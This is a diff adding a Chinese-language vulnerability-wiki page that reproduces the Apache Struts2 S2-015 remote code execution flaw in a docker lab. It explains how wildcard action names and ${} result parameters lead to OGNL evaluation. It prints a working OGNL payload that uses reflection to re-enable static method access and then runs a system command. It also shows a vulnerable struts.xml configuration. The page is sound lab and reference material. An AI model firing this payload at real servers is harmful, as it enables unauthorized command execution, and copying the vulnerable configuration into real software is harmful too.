@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/struts2/s2-015/README.zh-cn/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>S2-015 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "S2-015 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6d4b\u8bd5\u73af\u5883\u642d\u5efa", url: "#_1" },
+              {title: "\u539f\u7406\u4e0e\u6d4b\u8bd5", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../s2-016/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../s2-016/" class="btn btn-xs btn-link">
+        S2-016 Remote Code Execution Vulnerablity
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../" class="btn btn-xs btn-link">
+        S2-015 Remote Code Execution Vulnerablity
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="s2-015">S2-015 远程代码执行漏洞<a class="headerlink" href="#s2-015" title="Permanent link">&para;</a></h1>
+<p>影响版本: 2.0.0 - 2.3.14.2</p>
+<p>漏洞详情:</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-015.html">http://struts.apache.org/docs/s2-015.html</a></li>
+</ul>
+<h2 id="_1">测试环境搭建<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>docker compose build
+docker compose up -d
+</code></pre></div>
+<h2 id="_2">原理与测试<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;package</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;S2-015&quot;</span><span class="w"> </span><span class="na">extends=</span><span class="s">&quot;struts-default&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;*&quot;</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;com.demo.action.PageAction&quot;</span><span class="nt">&gt;</span>
+<span class="w">        </span><span class="nt">&lt;result&gt;</span>/{1}.jsp<span class="nt">&lt;/result&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/action&gt;</span>
+<span class="nt">&lt;/package&gt;</span>
+</code></pre></div>
+<p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / "  都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
+<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess['allowStaticMethodAccess']=true</code> 来修改其值达到重获静态方法调用的能力。</p>
+<p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder('calc')).start() 来解决，另外还可以借助 Java 反射机制去间接修改：</p>
+<div class="highlight"><pre><span></span><code>#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true)
+</code></pre></div>
+<p>可以构造 Payload 如下：</p>
+<div class="highlight"><pre><span></span><code>${#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q}
+</code></pre></div>
+<p>直接回显：</p>
+<p><img alt="" src="../01.png" /></p>
+<p>除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;action</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;param&quot;</span><span class="w"> </span><span class="na">class=</span><span class="s">&quot;com.demo.action.ParamAction&quot;</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nt">&lt;result</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;success&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;httpheader&quot;</span><span class="nt">&gt;</span>
+<span class="w">        </span><span class="nt">&lt;param</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;error&quot;</span><span class="nt">&gt;</span>305<span class="nt">&lt;/param&gt;</span>
+<span class="w">        </span><span class="nt">&lt;param</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;headers.fxxk&quot;</span><span class="nt">&gt;</span>${message}<span class="nt">&lt;/param&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/result&gt;</span>
+<span class="nt">&lt;/action&gt;</span>
+</code></pre></div>
+<p>这里配置了 <code>&lt;param name="errorMessage"&gt;${message}&lt;/param&gt;</code>，其中 message 为 ParamAction 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 message 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 %{1111*2} 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 struts.xml 中使用 ${param} 引用了 Action 中的变量所导致的，并不针对于 type="httpheader" 这种返回方式。</p>
+<p><img alt="" src="../02.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../s2-016/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../s2-016/" class="btn btn-xs btn-link">
+        S2-016 Remote Code Execution Vulnerablity
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../" class="btn btn-xs btn-link">
+        S2-015 Remote Code Execution Vulnerablity
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
